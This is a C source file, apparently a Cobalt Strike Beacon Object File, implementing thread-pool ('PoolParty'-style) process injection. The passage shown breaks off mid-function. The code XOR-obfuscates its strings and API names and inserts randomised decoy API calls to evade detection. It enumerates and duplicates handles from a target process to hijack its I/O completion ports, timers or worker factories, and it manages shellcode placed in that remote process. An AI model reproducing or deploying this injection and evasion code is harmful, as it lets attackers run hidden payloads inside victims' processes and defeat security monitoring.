static const unsigned char kFmtSuggestTimer[] = { 0xFC, 0x17, 0xCC, 0x7E, 0x78, 0xA1, 0x0F, 0x96, 0xC2, 0x4F, 0xE5, 0x37, 0x44, 0xBA, 0x52, 0xD1, 0xC9, 0x53, 0xB1, 0x17, 0x79, 0x80, 0x01, 0x9C, 0xC2, 0x4E, 0xAA, 0x7E, 0x5F, 0xA6, 0x11, 0xD1, 0xD1, 0x5D, 0xE3, 0x37, 0x4A, 0xBA, 0x1C, 0xD1, 0x90, 0x12 };
// "[+] Suggestion: no IRTimer; try variant 7."
static const unsigned char kFmtDeadPid[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x7F, 0xB5, 0x1A, 0x96, 0xC2, 0x48, 0xB1, 0x2E, 0x59, 0xBB, 0x0B, 0x94, 0xD4, 0x4F, 0xB1, 0x37, 0x58, 0xF4, 0x06, 0x9E, 0xD3, 0x1C, 0xE3, 0x2B, 0x45, 0xBA, 0x01, 0x9F, 0xC0, 0x12 };
// "[-] Target process is not running."
static const unsigned char kFmtArm64[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x7F, 0xB5, 0x1A, 0x96, 0xC2, 0x48, 0xB1, 0x37, 0x58, 0xF4, 0x29, 0xA3, 0xEA, 0x0A, 0xA5, 0x65, 0x0B, 0xAC, 0x5E, 0xC5, 0x87, 0x53, 0xFF, 0x32, 0x52, 0xFA };
// "[-] Target is ARM64; x64 only."
static const unsigned char kFmtWow64Query[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x68, 0xB5, 0x06, 0x9F, 0xC8, 0x48, 0xB1, 0x2F, 0x5E, 0xB1, 0x1A, 0x88, 0x87, 0x48, 0xF0, 0x2C, 0x4C, 0xB1, 0x1C, 0xD1, 0xC6, 0x4E, 0xF2, 0x36, 0x42, 0xA0, 0x0D, 0x92, 0xD3, 0x49, 0xE3, 0x3B, 0x05 };
// "[-] Cannot query target architecture."
static const unsigned char kFmtIocpType[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x7B, 0xBB, 0x07, 0x9D, 0x87, 0x75, 0xDE, 0x1D, 0x7B, 0xF4, 0x1C, 0x88, 0xD7, 0x59, 0xB1, 0x3D, 0x43, 0xB1, 0x0B, 0x9A, 0x87, 0x5A, 0xF0, 0x37, 0x47, 0xB1, 0x0C, 0xDF };
// "[-] Pool IOCP type check failed."
static const unsigned char kFmtMultiPool[] = { 0xFC, 0x17, 0xCC, 0x7E, 0x7C, 0xB5, 0x1A, 0x9F, 0xCE, 0x52, 0xF6, 0x64, 0x0B, 0xB9, 0x1D, 0x9D, 0xD3, 0x55, 0xE1, 0x32, 0x4E, 0xF4, 0x1C, 0x99, 0xD5, 0x59, 0xF0, 0x3A, 0x0B, 0xA4, 0x07, 0x9E, 0xCB, 0x4F, 0xAA, 0x7E, 0x4D, 0xBD, 0x1A, 0x82, 0xD3, 0x11, 0xFC, 0x3F, 0x5F, 0xB7, 0x00, 0xD1, 0xCA, 0x5D, 0xE8, 0x7E, 0x49, 0xB1, 0x48, 0x98, 0xC3, 0x50, 0xF4, 0x70 };
// "[+] Warning: multiple thread pools; first-match may be idle."
static const unsigned char kFmtInJob[] = { 0xFC, 0x17, 0xCC, 0x7E, 0x7C, 0xB5, 0x1A, 0x9F, 0xCE, 0x52, 0xF6, 0x64, 0x0B, 0xB6, 0x0D, 0x90, 0xC4, 0x53, 0xFF, 0x7E, 0x42, 0xA7, 0x48, 0x90, 0xCB, 0x4E, 0xF4, 0x3F, 0x4F, 0xAD, 0x48, 0x98, 0xC9, 0x1C, 0xF0, 0x7E, 0x41, 0xBB, 0x0A, 0xCA, 0x87, 0x5D, 0xE2, 0x2D, 0x42, 0xB3, 0x06, 0xD1, 0xCA, 0x5D, 0xE8, 0x7E, 0x4D, 0xB5, 0x01, 0x9D, 0x89 };
// "[+] Warning: beacon is already in a job; assign may fail."
static const unsigned char kFmtFlushWarn[] = { 0xFC, 0x17, 0xCC, 0x7E, 0x7C, 0xB5, 0x1A, 0x9F, 0xCE, 0x52, 0xF6, 0x64, 0x0B, 0x92, 0x04, 0x84, 0xD4, 0x54, 0xD8, 0x30, 0x58, 0xA0, 0x1A, 0x84, 0xC4, 0x48, 0xF8, 0x31, 0x45, 0x97, 0x09, 0x92, 0xCF, 0x59, 0xB1, 0x38, 0x4A, 0xBD, 0x04, 0x94, 0xC3, 0x12 };
// "[+] Warning: FlushInstructionCache failed."
static const unsigned char kFmtDisassocWarn[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x7D, 0xE2, 0x48, 0x95, 0xCE, 0x4F, 0xF0, 0x2D, 0x58, 0xBB, 0x0B, 0x98, 0xC6, 0x48, 0xF4, 0x7E, 0x4D, 0xB5, 0x01, 0x9D, 0xC2, 0x58, 0xAA, 0x7E, 0x58, 0xBC, 0x0D, 0x9D, 0xCB, 0x5F, 0xFE, 0x3A, 0x4E, 0xF4, 0x05, 0x90, 0xDE, 0x1C, 0xE3, 0x2B, 0x45, 0xF4, 0x09, 0x96, 0xC6, 0x55, 0xFF, 0x7E, 0x44, 0xBA, 0x48, 0x93, 0xC2, 0x5D, 0xF2, 0x31, 0x45, 0xF4, 0x0D, 0x89, 0xCE, 0x48, 0xBF };
// "[-] V6 disassociate failed; shellcode may run again on beacon exit."
static const unsigned char kFmtRestoreWriteFail[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x7F, 0xBD, 0x05, 0x94, 0xD5, 0x11, 0xE0, 0x2B, 0x4E, 0xA1, 0x0D, 0xD1, 0xD5, 0x59, 0xE2, 0x2A, 0x44, 0xA6, 0x0D, 0xD1, 0xD0, 0x4E, 0xF8, 0x2A, 0x4E, 0xF4, 0x0E, 0x90, 0xCE, 0x50, 0xF4, 0x3A, 0x05 };
// "[-] Timer-queue restore write failed."
static const unsigned char kFmtRestoreOk[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xF5, 0x59, 0xE2, 0x2A, 0x44, 0xA6, 0x0D, 0x95, 0x87, 0x48, 0xF8, 0x33, 0x4E, 0xA6, 0x45, 0x80, 0xD2, 0x59, 0xE4, 0x3B, 0x0B, 0xA6, 0x07, 0x9E, 0xD3, 0x4F, 0xBF };
// "[INFO] \tRestored timer-queue roots."
static const unsigned char kFmtCopyGuard[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x67, 0xBB, 0x0B, 0x90, 0xCB, 0x1C, 0xE5, 0x36, 0x59, 0xB1, 0x09, 0x95, 0x8A, 0x4C, 0xFE, 0x31, 0x47, 0xF4, 0x07, 0x93, 0xCD, 0x59, 0xF2, 0x2A, 0x0B, 0xA7, 0x05, 0x90, 0xCB, 0x50, 0xF4, 0x2C, 0x0B, 0xA0, 0x00, 0x90, 0xC9, 0x1C, 0xF4, 0x26, 0x5B, 0xB1, 0x0B, 0x85, 0xC2, 0x58, 0xBF };
// "[-] Local thread-pool object smaller than expected."
static const unsigned char kApiIsWow64Process2[] = { 0xEE, 0x4F, 0xC6, 0x31, 0x5C, 0xE2, 0x5C, 0xA1, 0xD5, 0x53, 0xF2, 0x3B, 0x58, 0xA7, 0x5A };
// "IsWow64Process2"
static const unsigned char kApiRtlGetVersion[] = { 0xF5, 0x48, 0xFD, 0x19, 0x4E, 0xA0, 0x3E, 0x94, 0xD5, 0x4F, 0xF8, 0x31, 0x45 };
// "RtlGetVersion"
static const unsigned char kModKernel32[] = { 0xCC, 0x59, 0xE3, 0x30, 0x4E, 0xB8, 0x5B, 0xC3, 0x89, 0x58, 0xFD, 0x32 };
// "kernel32.dll"

static void ObfWipe(char *dst, int n) {
    int i;
    for (i = 0; i < n; i++) {
        dst[i] = 0;
    }
}

static void ObfDec(char *dst, const unsigned char *src, int n) {
    int i;
    if (n < 0) {
        n = 0;
    }
    if (n >= OBF_BUFSZ) {
        n = OBF_BUFSZ - 1;
    }
    for (i = 0; i < n; i++) {
        dst[i] = (char)(src[i] ^ g_obfKey[i % OBF_KEY_LEN]);
    }
    dst[n] = '\0';
}

static void ObfDecBytes(unsigned char *dst, const unsigned char *src, int n) {
    int i;
    for (i = 0; i < n; i++) {
        dst[i] = (unsigned char)(src[i] ^ g_obfKey[i % OBF_KEY_LEN]);
    }
}

#define OBF_PRINT0(type, enc) do { \
    char _obf[OBF_BUFSZ]; \
    ObfDec(_obf, (enc), (int)sizeof(enc)); \
    BeaconPrintf((type), _obf); \
    ObfWipe(_obf, OBF_BUFSZ); \
} while (0)

#define OBF_PRINT1(type, enc, a1) do { \
    char _obf[OBF_BUFSZ]; \
    ObfDec(_obf, (enc), (int)sizeof(enc)); \
    BeaconPrintf((type), _obf, (a1)); \
    ObfWipe(_obf, OBF_BUFSZ); \
} while (0)

#define OBF_PRINT2(type, enc, a1, a2) do { \
    char _obf[OBF_BUFSZ]; \
    ObfDec(_obf, (enc), (int)sizeof(enc)); \
    BeaconPrintf((type), _obf, (a1), (a2)); \
    ObfWipe(_obf, OBF_BUFSZ); \
} while (0)

static void *BofAlloc(SIZE_T sz) {
    return KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sz);
}

static void *BofRealloc(void *p, SIZE_T sz) {
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    if (p == NULL) {
        return KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sz);
    }
    return KERNEL32$HeapReAlloc(hHeap, HEAP_ZERO_MEMORY, p, sz);
}

static void BofFree(void *p) {
    if (p != NULL) {
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, p);
    }
}

static FARPROC ResolveNtdllEnc(const unsigned char *enc, int n) {
    char name[64];
    char dll[16];
    HMODULE hNtdll;
    FARPROC p;

    if (enc == NULL || n <= 0 || n >= (int)sizeof(name)) {
        return NULL;
    }
    ObfDec(dll, kModNtdll, (int)sizeof(kModNtdll));
    ObfDec(name, enc, n);
    hNtdll = KERNEL32$GetModuleHandleA(dll);
    ObfWipe(dll, (int)sizeof(dll));
    if (hNtdll == NULL) {
        ObfWipe(name, (int)sizeof(name));
        return NULL;
    }
    p = KERNEL32$GetProcAddress(hNtdll, name);
    ObfWipe(name, (int)sizeof(name));
    return p;
}

static void SeedRng(void) {
    MSVCRT$srand(KERNEL32$GetTickCount() ^ KERNEL32$GetCurrentProcessId());
}

static void ApiPauseDecoy(int round, volatile DWORD *acc) {
    FILETIME ft;
    LARGE_INTEGER pc;
    SYSTEM_INFO si;
    SYSTEMTIME st;
    unsigned int which;

    which = ((unsigned int)round + (unsigned int)MSVCRT$rand() + (unsigned int)(*acc)) % 8u;
    switch (which) {
    case 0:
        *acc ^= KERNEL32$GetTickCount();
        break;
    case 1:
        *acc ^= KERNEL32$GetCurrentThreadId();
        break;
    case 2:
        KERNEL32$GetSystemTimeAsFileTime(&ft);
        *acc ^= ft.dwLowDateTime;
        break;
    case 3:
        if (KERNEL32$QueryPerformanceCounter(&pc)) {
            *acc ^= (DWORD)pc.QuadPart;
        }
        break;
    case 4:
        KERNEL32$GetSystemInfo(&si);
        *acc ^= si.dwNumberOfProcessors;
        break;
    case 5:
        KERNEL32$GetLocalTime(&st);
        *acc ^= ((DWORD)st.wSecond << 16) | st.wMilliseconds;
        break;
    case 6:
        *acc ^= (DWORD)(ULONG_PTR)KERNEL32$GetProcessHeap();
        break;
    default:
        *acc ^= KERNEL32$GetCurrentProcessId();
        break;
    }
}

static void ApiPause(void) {
    DWORD start;
    DWORD round;
    volatile DWORD acc;
    int i;
    int n;
    static int seeded;

    if (m_dwApiDelayMs == 0) {
        return;
    }
    if (!seeded) {
        SeedRng();
        seeded = 1;
    }
    start = KERNEL32$GetTickCount();
    acc = start ^ KERNEL32$GetCurrentProcessId();
    round = 0;
    while ((KERNEL32$GetTickCount() - start) < m_dwApiDelayMs) {
        n = 32 + (int)(acc & 63u);
        for (i = 0; i < n; i++) {
            acc = (acc * 1664525u) + 1013904223u;
            acc ^= (acc >> 13);
        }
        ApiPauseDecoy((int)round, &acc);
        KERNEL32$SwitchToThread();
        round++;
    }
}

static wchar_t RandAlnumW(void) {
    int r = MSVCRT$rand() % 62;
    if (r < 10) {
        return (wchar_t)(L'0' + r);
    }
    if (r < 36) {
        return (wchar_t)(L'A' + (r - 10));
    }
    return (wchar_t)(L'a' + (r - 36));
}

static wchar_t *GenerateRandomLetters(int length) {
    int i;
    wchar_t *s;
    if (length <= 0) {
        return NULL;
    }
    s = (wchar_t *)BofAlloc((SIZE_T)(length + 1) * sizeof(wchar_t));
    if (s == NULL) {
        return NULL;
    }
    for (i = 0; i < length; i++) {
        s[i] = RandAlnumW();
    }
    s[length] = L'\0';
    return s;
}

static void CloseHandleSafe(HANDLE *h) {
    if (h != NULL && *h != NULL && *h != INVALID_HANDLE_VALUE) {
        KERNEL32$CloseHandle(*h);
        *h = NULL;
    }
}

#ifdef PP_HIJACK_TIMER
static void CloseTpTimerSafe(PTP_TIMER pti) {
    if (pti == NULL) {
        return;
    }
    /*
     * Cancel without waiting. WaitForThreadpoolTimerCallbacks can deadlock
     * if this BOF is running on a thread-pool worker.
     */
    KERNEL32$SetThreadpoolTimer(pti, NULL, 0, 0);
    KERNEL32$CloseThreadpoolTimer(pti);
}
#endif

#ifdef PP_NEED_TP_IO
static void CloseTpIoSafe(PTP_IO pio) {
    if (pio == NULL) {
        return;
    }
    /*
     * Do not WaitForThreadpoolIoCallbacks here. After the file's completion
     * port is redirected to the target, a wait can hang the beacon.
     */
    KERNEL32$CloseThreadpoolIo(pio);
}
#endif

static void RemoteFree(LPVOID p) {
    if (p != NULL && m_p_hTargetPid != NULL) {
        KERNEL32$VirtualFreeEx(m_p_hTargetPid, p, 0, MEM_RELEASE);
    }
}

static void FreeShellcodeRemote(void) {
    if (m_ShellcodeAddress != NULL && m_p_hTargetPid != NULL) {
        KERNEL32$VirtualFreeEx(m_p_hTargetPid, m_ShellcodeAddress, 0, MEM_RELEASE);
        m_ShellcodeAddress = NULL;
    }
}

static void MarkPublished(void) {
    m_bShellcodePublished = TRUE;
}

static void FreeShellcodeIfUnpublished(void) {
    if (!m_bShellcodePublished) {
        FreeShellcodeRemote();
    }
}

static void ResetSharedState(void) {
    m_p_hTargetPid = NULL;
    m_dwTargetPid = 0;
    m_ShellcodeAddress = NULL;
    m_cShellcode = NULL;
    m_szShellcodeSize = 0;
    m_dwApiDelayMs = 0;
    m_bDripAlloc = FALSE;
    m_dwDripDelayMs = 0;
    m_bSanityOnly = FALSE;
    m_bShellcodePublished = FALSE;
    m_dwWfTypeIndex = 0;
}

static void WaitMs(DWORD ms) {
    DWORD start;

    if (ms == 0) {
        return;
    }
    start = KERNEL32$GetTickCount();
    while ((KERNEL32$GetTickCount() - start) < ms) {
        KERNEL32$SwitchToThread();
    }
}

static BOOL SnapshotAccessOk(ACCESS_MASK granted, DWORD desired) {
    if ((granted & GENERIC_ALL) == GENERIC_ALL) {
        return TRUE;
    }
    return ((granted & desired) == desired) ? TRUE : FALSE;
}

static BOOL UnicodeNameEquals(PUNICODE_STRING us, const wchar_t *want, int wantChars) {
    int i;
    int n;

    if (us == NULL || us->Buffer == NULL || want == NULL || wantChars <= 0) {
        return FALSE;
    }
    n = (int)(us->Length / sizeof(WCHAR));
    if (n != wantChars) {
        return FALSE;
    }
    for (i = 0; i < n; i++) {
        if (us->Buffer[i] != want[i]) {
            return FALSE;
        }
    }
    return TRUE;
}

static int WideEncChars(const unsigned char *enc, int n) {
    wchar_t tmp[64];
    int nChars;

    if (enc == NULL || n <= 0 || n > (int)sizeof(tmp)) {
        return 0;
    }
    MSVCRT$memset(tmp, 0, sizeof(tmp));
    ObfDecBytes((unsigned char *)tmp, enc, n);
    nChars = (int)(n / (int)sizeof(wchar_t));
    if (nChars > 0 && tmp[nChars - 1] == L'\0') {
        nChars--;
    }
    MSVCRT$memset(tmp, 0, sizeof(tmp));
    return nChars;
}

static BOOL LocalObjectFits(LPCVOID p, SIZE_T need) {
    MEMORY_BASIC_INFORMATION mbi;
    ULONG_PTR start;
    ULONG_PTR end;
    ULONG_PTR regionEnd;

    if (p == NULL || need == 0) {
        return FALSE;
    }
    MSVCRT$memset(&mbi, 0, sizeof(mbi));
    if (KERNEL32$VirtualQuery(p, &mbi, sizeof(mbi)) == 0) {
        return FALSE;
    }
    if (mbi.State != MEM_COMMIT) {
        return FALSE;
    }
    start = (ULONG_PTR)p;
    end = start + need;
    if (end < start) {
        return FALSE;
    }
    regionEnd = (ULONG_PTR)mbi.BaseAddress + mbi.RegionSize;
    if (start < (ULONG_PTR)mbi.BaseAddress || end > regionEnd) {
        return FALSE;
    }
    return TRUE;
}

static void SanitizeTpDirect(PTP_DIRECT d) {
    if (d == NULL) {
        return;
    }
    d->Task.ListEntry.Flink = NULL;
    d->Task.ListEntry.Blink = NULL;
    d->IoCompletionInformationList.Flink = NULL;
    d->IoCompletionInformationList.Blink = NULL;
}

static void SanitizeCleanupGroupMember(PTPP_CLEANUP_GROUP_MEMBER m) {
    if (m == NULL) {
        return;
    }
    m->CleanupGroup = NULL;
    m->CleanupGroupCancelCallback = NULL;
    m->FinalizationCallback = NULL;
    m->CleanupGroupMemberLinks.Flink = NULL;
    m->CleanupGroupMemberLinks.Blink = NULL;
    m->Context = NULL;
    m->ActivationContext = NULL;
    m->SubProcessTag = NULL;
    m->RaceDll = NULL;
    m->Pool = NULL;
    m->PoolObjectLinks.Flink = NULL;
    m->PoolObjectLinks.Blink = NULL;
}

#ifdef PP_NEED_TP_IO
static VOID CALLBACK DummyIoCallback(
    PTP_CALLBACK_INSTANCE Instance,
    PVOID Context,
    PVOID Overlapped,
    ULONG IoResult,
    ULONG_PTR NumberOfBytesTransferred,
    PTP_IO Io)
{
    (void)Instance;
    (void)Context;
    (void)Overlapped;
    (void)IoResult;
    (void)NumberOfBytesTransferred;
    (void)Io;
}
#endif

#ifdef PP_NEED_ALPC
static VOID NTAPI DummyAlpcCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_ALPC Alpc) {
    (void)Instance;
    (void)Context;
    (void)Alpc;
}
#endif

#ifdef PP_NEED_JOB
static VOID NTAPI DummyJobCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PVOID Job) {
    (void)Instance;
    (void)Context;
    (void)Job;
}
#endif

#ifdef PP_HIJACK_TIMER
static VOID CALLBACK DummyTimerCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_TIMER Timer) {
    (void)Instance;
    (void)Context;
    (void)Timer;
}
#endif

static BOOL CopyLocalTpObject(void *dst, const void *src, SIZE_T n) {
    if (dst == NULL || src == NULL || n == 0) {
        return FALSE;
    }
    if (!LocalObjectFits(src, n)) {
        OBF_PRINT0(CALLBACK_ERROR, kFmtCopyGuard);
        return FALSE;
    }
    MSVCRT$memcpy(dst, src, n);
    return TRUE;
}

static BOOL PlausibleUserPtr(PVOID p, BOOL nullOk) {
    ULONG_PTR v;

    v = (ULONG_PTR)p;
    if (v == 0) {
        return nullOk;
    }
    if (v < 0x10000ull) {
        return FALSE;
    }
    if ((v & 7ull) != 0) {
        return FALSE;
    }
    if (v > 0x00007FFFFFFEFFFFull) {
        return FALSE;
    }
    return TRUE;
}

static BOOL HostIsWin81OrNewer(void) {
    OSVERSIONINFOW vi;
    _RtlGetVersion RtlGetVersion;

    RtlGetVersion = (_RtlGetVersion)ResolveNtdllEnc(kApiRtlGetVersion, (int)sizeof(kApiRtlGetVersion));
    if (RtlGetVersion == NULL) {
        return FALSE;
    }
    MSVCRT$memset(&vi, 0, sizeof(vi));
    vi.dwOSVersionInfoSize = sizeof(vi);
    if (!NT_SUCCESS(RtlGetVersion(&vi))) {
        return FALSE;
    }
    if (vi.dwMajorVersion > 6) {
        return TRUE;
    }
    if (vi.dwMajorVersion == 6 && vi.dwMinorVersion >= 3) {
        return TRUE;
    }
    return FALSE;
}

static BOOL GrowInfoBuffer(BYTE **pp, ULONG *pLen, ULONG needed) {
    BYTE *ninfo;
    ULONG next;

    if (pp == NULL || pLen == NULL) {
        return FALSE;
    }
    next = *pLen;
    if (needed > next) {
        next = needed;
    } else {
        if (next > (0xFFFFFFFFu / 2u)) {
            return FALSE;
        }
        next *= 2u;
    }
    if (next < needed) {
        return FALSE;
    }
    if (next > PP_INFO_MAX) {
        next = PP_INFO_MAX;
        if (needed > next) {
            return FALSE;
        }
    }
    ninfo = (BYTE *)BofRealloc(*pp, next);
    if (ninfo == NULL) {
        return FALSE;
    }
    *pp = ninfo;
    *pLen = next;
    return TRUE;
}

BYTE* NtQueryObject_(HANDLE x, OBJECT_INFORMATION_CLASS y) {
    _NtQueryObject NtQueryObject;
    ULONG InformationLength;
    ULONG ReturnLength;
    ULONG needed;
    int retries;
    NTSTATUS Ntstatus;
    BYTE* Information;

    if (x == NULL) {
        return NULL;
    }

    NtQueryObject = (_NtQueryObject)ResolveNtdllEnc(kApiNtQueryObject, (int)sizeof(kApiNtQueryObject));
    if (NtQueryObject == NULL) {
        return NULL;
    }

    InformationLength = 0x100;
    ReturnLength = 0;
    Information = (BYTE*)BofAlloc(InformationLength);
    if (Information == NULL) {
        return NULL;
    }

    retries = 0;
    while (1) {
        if (retries >= PP_INFO_RETRIES) {
            BofFree(Information);
            return NULL;
        }
        retries++;
        Ntstatus = NtQueryObject(x, y, Information, InformationLength, &ReturnLength);
        if (Ntstatus != STATUS_INFO_LENGTH_MISMATCH &&
            Ntstatus != STATUS_BUFFER_OVERFLOW &&
            Ntstatus != STATUS_BUFFER_TOO_SMALL) {
            break;
        }
        needed = ReturnLength;
        if (needed <= InformationLength) {
            if (InformationLength > (0xFFFFFFFFu / 2u)) {
                BofFree(Information);
                return NULL;
            }
            needed = InformationLength * 2u;
        }
        if (!GrowInfoBuffer(&Information, &InformationLength, needed)) {
            BofFree(Information);
            return NULL;
        }
    }

    if (!NT_SUCCESS(Ntstatus)) {
        BofFree(Information);
        return NULL;
    }
    return Information;
}

static BYTE *QueryHandleSnapshotEx(HANDLE hProc, ULONG *pLen) {
    _NtQueryInformationProcess NtQueryInformationProcess;
    BYTE* Information;
    ULONG InformationLength;
    ULONG ReturnLength;
    ULONG needed;
    int retries;
    NTSTATUS Ntstatus;

    if (pLen != NULL) {
        *pLen = 0;
    }
    if (hProc == NULL) {
        return NULL;
    }

    NtQueryInformationProcess = (_NtQueryInformationProcess)ResolveNtdllEnc(kApiNtQueryInformationProcess, (int)sizeof(kApiNtQueryInformationProcess));
    if (NtQueryInformationProcess == NULL) {
        return NULL;
    }

    ReturnLength = 0;
    NtQueryInformationProcess(
        hProc,
        (PROCESSINFOCLASS)ProcessHandleInformation,
        NULL,
        0,
        &ReturnLength);
    if (ReturnLength == 0) {
        return NULL;
    }

    InformationLength = ReturnLength + 0x1000;
    if (InformationLength < ReturnLength || InformationLength > PP_INFO_MAX) {
        InformationLength = (ReturnLength > PP_INFO_MAX) ? PP_INFO_MAX : ReturnLength;
        if (InformationLength == 0) {
            return NULL;
        }
    }
    Information = (BYTE*)BofAlloc(InformationLength);
    if (Information == NULL) {
        return NULL;
    }

    retries = 0;
    while (1) {
        if (retries >= PP_INFO_RETRIES) {
            BofFree(Information);
            return NULL;
        }
        retries++;
        Ntstatus = NtQueryInformationProcess(
            hProc,
            (PROCESSINFOCLASS)ProcessHandleInformation,
            Information,
            InformationLength,
            &ReturnLength);
        if (Ntstatus != STATUS_INFO_LENGTH_MISMATCH &&
            Ntstatus != STATUS_BUFFER_OVERFLOW &&
            Ntstatus != STATUS_BUFFER_TOO_SMALL) {
            break;
        }
        needed = ReturnLength;
        if (needed <= InformationLength) {
            if (InformationLength > (0xFFFFFFFFu - 0x1000u)) {
                BofFree(Information);
                return NULL;
            }
            needed = InformationLength + 0x1000u;
        } else {
            if (needed > (0xFFFFFFFFu - 0x1000u)) {
                BofFree(Information);
                return NULL;
            }
            needed += 0x1000u;
        }
        if (!GrowInfoBuffer(&Information, &InformationLength, needed)) {
            BofFree(Information);
            return NULL;
        }
    }

    if (!NT_SUCCESS(Ntstatus) || Information == NULL) {
        BofFree(Information);
        return NULL;
    }
    if (pLen != NULL) {
        *pLen = InformationLength;
    }
    return Information;
}

static BYTE *QueryHandleSnapshot(HANDLE hProc) {
    return QueryHandleSnapshotEx(hProc, NULL);
}

static ULONG_PTR SnapshotHandleCount(BYTE *Information, ULONG infoLen) {
    PPROCESS_HANDLE_SNAPSHOT_INFORMATION snap;
    ULONG_PTR cap;

    if (Information == NULL || infoLen < sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION)) {
        return 0;
    }
    snap = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)Information;
    cap = (infoLen - offsetof(PROCESS_HANDLE_SNAPSHOT_INFORMATION, Handles)) / sizeof(PROCESS_HANDLE_TABLE_ENTRY_INFO);
    if (snap->NumberOfHandles < cap) {
        return snap->NumberOfHandles;
    }
    return cap;
}

static ULONG TypeIndexFromLocalHandle(HANDLE h) {
    BYTE *Information;
    PPROCESS_HANDLE_SNAPSHOT_INFORMATION snap;
    ULONG_PTR i;
    ULONG_PTR n;
    ULONG idx;
    ULONG infoLen;

    if (h == NULL || h == INVALID_HANDLE_VALUE) {
        return 0;
    }
    infoLen = 0;
    Information = QueryHandleSnapshotEx(KERNEL32$GetCurrentProcess(), &infoLen);
    if (Information == NULL) {
        return 0;
    }
    snap = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)Information;
    idx = 0;
    n = SnapshotHandleCount(Information, infoLen);
    for (i = 0; i < n; i++) {
        if (snap->Handles[i].HandleValue == h) {
            idx = snap->Handles[i].ObjectTypeIndex;
            break;
        }
    }
    BofFree(Information);
    return idx;
}

#ifdef PP_HIJACK_IOCP
static ULONG LocalIoCompletionTypeIndex(void) {
    HANDLE h;
    ULONG idx;

    h = KERNEL32$CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
    if (h == NULL) {
        return 0;
    }
    idx = TypeIndexFromLocalHandle(h);
    KERNEL32$CloseHandle(h);
    return idx;
}
#endif

#ifdef PP_HIJACK_TIMER
static ULONG LocalIrTimerTypeIndex(void) {
    HANDLE h;
    ULONG idx;

    h = KERNEL32$CreateWaitableTimerExW(NULL, NULL, CREATE_WAITABLE_TIMER_HIGH_RESOLUTION, TIMER_QUERY_STATE);
    if (h == NULL) {
        return 0;
    }
    idx = TypeIndexFromLocalHandle(h);
    KERNEL32$CloseHandle(h);
    return idx;
}
#endif

HANDLE HijackProcessHandle(PWSTR wsObjectType, HANDLE p_hTarget, DWORD dwDesiredAccess, ULONG typeIndex) {
    BYTE* Information;
    PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcessHandleInformation;
    HANDLE found;
    ULONG_PTR i;
    ULONG_PTR n;
    ULONG infoLen;
    int wantChars;

    if (wsObjectType == NULL || p_hTarget == NULL) {
        return NULL;
    }

    infoLen = 0;
    Information = QueryHandleSnapshotEx(p_hTarget, &infoLen);
    if (Information == NULL) {
        return NULL;
    }

    pProcessHandleInformation = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)Information;
    found = NULL;
    wantChars = (int)MSVCRT$wcslen(wsObjectType);
    n = SnapshotHandleCount(Information, infoLen);

    for (i = 0; i < n; i++) {
        HANDLE p_hDuplicatedObject = NULL;
        BYTE* pObjectInformation;
        PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInformation;
        ACCESS_MASK granted;
        ULONG snapType;
        BOOL nameOk;

        granted = pProcessHandleInformation->Handles[i].GrantedAccess;
        if (!SnapshotAccessOk(granted, dwDesiredAccess)) {
            continue;
        }
        snapType = pProcessHandleInformation->Handles[i].ObjectTypeIndex;
        if (typeIndex != 0 && snapType != typeIndex) {
            continue;
        }

        if (!KERNEL32$DuplicateHandle(
            p_hTarget,
            pProcessHandleInformation->Handles[i].HandleValue,
            KERNEL32$GetCurrentProcess(),
            &p_hDuplicatedObject,
            dwDesiredAccess,
            FALSE,
            0)) {
            continue;
        }

        if (typeIndex != 0) {
            found = p_hDuplicatedObject;
            break;
        }

#if defined(PP_HIJACK_TIMER) || defined(PP_RESOLVE_POOL_IOCP)
        if (m_dwWfTypeIndex != 0 && snapType == m_dwWfTypeIndex) {
            wchar_t wfName[64];
            int wfChars;

            MSVCRT$memset(wfName, 0, sizeof(wfName));
            ObfDecBytes((unsigned char *)wfName, kTypeWorkerFactory, (int)sizeof(kTypeWorkerFactory));
            wfChars = WideEncChars(kTypeWorkerFactory, (int)sizeof(kTypeWorkerFactory));
            if (wantChars == wfChars && MSVCRT$wcsncmp(wsObjectType, wfName, (size_t)wantChars) == 0) {
                MSVCRT$memset(wfName, 0, sizeof(wfName));
                found = p_hDuplicatedObject;
                break;
            }
            MSVCRT$memset(wfName, 0, sizeof(wfName));
        }
#endif

        pObjectInformation = NtQueryObject_(p_hDuplicatedObject, ObjectTypeInformation);
        if (pObjectInformation == NULL) {
            KERNEL32$CloseHandle(p_hDuplicatedObject);
            continue;
        }

        pObjectTypeInformation = (PPUBLIC_OBJECT_TYPE_INFORMATION)pObjectInformation;
        nameOk = UnicodeNameEquals(&pObjectTypeInformation->TypeName, wsObjectType, wantChars);
        BofFree(pObjectInformation);
        if (!nameOk) {
            KERNEL32$CloseHandle(p_hDuplicatedObject);
            continue;
        }

#if defined(PP_HIJACK_TIMER) || defined(PP_RESOLVE_POOL_IOCP)
        {
            wchar_t wfName[64];
            int wfChars;

            MSVCRT$memset(wfName, 0, sizeof(wfName));
            ObfDecBytes((unsigned char *)wfName, kTypeWorkerFactory, (int)sizeof(kTypeWorkerFactory));
            wfChars = WideEncChars(kTypeWorkerFactory, (int)sizeof(kTypeWorkerFactory));
            if (wantChars == wfChars && MSVCRT$wcsncmp(wsObjectType, wfName, (size_t)wantChars) == 0 && snapType != 0) {
